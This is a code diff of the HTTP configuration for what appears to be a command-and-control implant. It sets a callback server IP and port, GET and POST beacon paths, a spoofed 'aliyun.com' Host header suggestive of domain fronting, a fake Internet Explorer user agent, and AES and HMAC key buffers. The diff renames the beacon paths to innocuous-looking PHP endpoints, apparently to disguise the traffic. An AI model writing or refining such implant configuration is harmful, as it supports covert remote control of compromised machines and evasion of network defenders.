@@ -3,8 +3,8 @@
 
 // HTTP configuration
 const wchar_t* g_server = L"192.168.86.132";
-const wchar_t* g_get_path = L"/www/handle/doc";
-const wchar_t* g_post_path = L"/IMXo";
+const wchar_t* g_get_path = L"/html/index.php";
+const wchar_t* g_post_path = L"/api/update.php";
 INTERNET_PORT g_port = 8011;
 const wchar_t* g_host_header = L"Host: aliyun.com\r\n";
 const wchar_t* g_user_agent_header = L"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9; ENUS)\r\n";
@@ -43,4 +43,8 @@ unsigned char g_aeskey[16] = { 0 };
 unsigned char g_hmackey[16] = { 0 };
 int g_counter = 0;
 int g_client_id = 0;
+
+// other 
+const char* g_end_string = "----------------------------------- end -----------------------------------\n";
+
 
